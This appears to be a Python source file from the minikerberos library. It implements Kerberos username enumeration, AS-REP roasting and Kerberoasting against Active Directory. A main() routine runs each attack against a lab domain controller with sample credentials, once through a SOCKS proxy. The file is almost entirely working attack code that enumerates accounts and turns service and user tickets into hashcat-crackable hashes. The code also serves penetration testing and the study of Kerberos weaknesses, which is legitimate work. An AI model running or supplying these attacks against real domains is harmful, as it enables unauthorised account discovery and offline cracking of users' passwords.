#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#

import datetime
import secrets

from minikerberos import logger
from minikerberos.aioclient import AIOKerberosClient
from minikerberos.common.spn import KerberosSPN
from minikerberos.common.target import KerberosTarget
from minikerberos.common.creds import KerberosCredential
from minikerberos.common.utils import TGSTicket2hashcat, TGTTicket2hashcat
from minikerberos import logger
from minikerberos.protocol.asn1_structs import PrincipalName, KDCOptions, \
	PADATA_TYPE, PA_PAC_REQUEST, krb5_pvno, KDC_REQ_BODY, AS_REQ

from minikerberos.protocol.errors import KerberosErrorCode
from minikerberos.protocol.constants import NAME_TYPE, MESSAGE_TYPE
from minikerberos.network.selector import KerberosClientSocketSelector


class KerberosEtypeTest:
	# TODO: implement this
	pass

class KerberosUserEnum:
	def __init__(self, target: KerberosTarget, spn: KerberosSPN):
		self.target = target
		self.spn = spn
		self.ksoc = KerberosClientSocketSelector.select(target, True)


	def construct_tgt_req(self):
		now = now = datetime.datetime.now(datetime.timezone.utc)
		kdc_req_body = {}
		kdc_req_body['kdc-options'] = KDCOptions(set(['forwardable','renewable','proxiable']))
		kdc_req_body['cname'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': [self.spn.username]})
		kdc_req_body['realm'] = self.spn.domain.upper()
		kdc_req_body['sname'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': ['krbtgt', self.spn.domain.upper()]})
		kdc_req_body['till']  = (now + datetime.timedelta(days=1)).replace(microsecond=0)
		kdc_req_body['rtime'] = (now + datetime.timedelta(days=1)).replace(microsecond=0)
		kdc_req_body['nonce'] = secrets.randbits(31)
		kdc_req_body['etype'] = [2, 3, 16, 23, 17, 18] #we "support" all MS related enctypes
		
		pa_data_1 = {}
		pa_data_1['padata-type'] = int(PADATA_TYPE('PA-PAC-REQUEST'))
		pa_data_1['padata-value'] = PA_PAC_REQUEST({'include-pac': True}).dump()
		
		kdc_req = {}
		kdc_req['pvno'] = krb5_pvno
		kdc_req['msg-type'] = MESSAGE_TYPE.KRB_AS_REQ.value
		kdc_req['padata'] = [pa_data_1]
		kdc_req['req-body'] = KDC_REQ_BODY(kdc_req_body)
		
		return AS_REQ(kdc_req)

	async def run(self):
		req = self.construct_tgt_req()

		rep = await self.ksoc.sendrecv(req.dump(), throw = False)

		if rep.name != 'KRB_ERROR':	
			# user doesnt need preauth, but it exists
			return True
			
		elif rep.native['error-code'] != KerberosErrorCode.KDC_ERR_PREAUTH_REQUIRED.value:
			# any other error means user doesnt exist
			return False
			
		else:
			# preauth needed, only if user exists
			return True

class APREPRoast:
	def __init__(self, target: KerberosTarget):
		self.target = target

	async def run(self, cred: KerberosCredential, override_etype = [23]):
		"""
		override_etype: list : list of supported encryption types
		"""
		try:
			kcomm = AIOKerberosClient(cred, self.target)
			await kcomm.get_TGT(override_etype = override_etype, decrypt_tgt = False)
			return TGTTicket2hashcat(kcomm.kerberos_TGT)
		except Exception as e:
			logger.debug('Error while roasting client %s/%s Reason: %s' % (cred.domain, cred.username, str(e)))
			raise e

class Kerberoast:
	def __init__(self, target: KerberosTarget, cred: KerberosCredential):
		self.target = target
		self.cred = cred

	async def run(self, spns, override_etype = [2, 3, 16, 23, 17, 18]):
		try:
			kcomm = AIOKerberosClient(self.cred, self.target)
			await kcomm.get_TGT(override_etype = override_etype, decrypt_tgt = False)
		except Exception as e:
			logger.exception('a')
			logger.debug('Error logging in! Reason: %s' % (str(e)))
			raise e

		results = []
		for spn in spns:
			try:
				tgs, _, _ = await kcomm.get_TGS(spn, override_etype = override_etype)
				results.append(TGSTicket2hashcat(tgs))
			except Exception as e:
				logger.exception('b')
				logger.debug('Failed to get TGS ticket for user %s/%s/%s! Reason: %s' % (spn.domain, str(spn.service), spn.username, str(e)))
				continue

		return results

async def main():
	url = 'kerberos+pw://teas\\test:pass@10.10.10.2'
	ku = KerberosClientURL.from_url(url)
	target_user = 'asdadfadsf@TEST.corp'
	target = ku.get_target()
	print(target)
	spn = KerberosSPN.from_user_email(target_user)
	ue = KerberosUserEnum(target, spn)
	res = await ue.run()
	print(res)
	
	url = 'kerberos+pw://TEST\\asreptest:pass@10.10.10.2'
	ku = KerberosClientURL.from_url(url)
	target = ku.get_target()
	cred = ku.get_creds()
	arr = APREPRoast(target)
	res = await arr.run(cred)
	print(res)


	target_user = 'srv_http@TEST.corp'
	spn = KerberosSPN.from_user_email(target_user)
	url = 'kerberos+pw://TEST\\victim:Passw0rd!1@10.10.10.2/?timeout=77'
	ku = KerberosClientURL.from_url(url)
	target = ku.get_target()
	cred = ku.get_creds()
	arr = Kerberoast(target, cred)
	res = await arr.run([spn])
	print(res)

	target_user = 'srv_http@TEST.corp'
	spn = KerberosSPN.from_user_email(target_user)
	url = 'kerberos+pw://TEST\\victim:Passw0rd!1@10.10.10.2/?proxyhost=10.10.10.102&proxytype=socks5&proxyport=1080'
	ku = KerberosClientURL.from_url(url)
	target = ku.get_target()
	print(target)
	cred = ku.get_creds()
	arr = Kerberoast(target, cred)
	res = await arr.run([spn])
	print(res)

if __name__ == '__main__':
	from asysocks import logger as alogger
	from minikerberos.common.url import KerberosClientURL
	import asyncio
	alogger.setLevel(2)
	asyncio.run(main())
	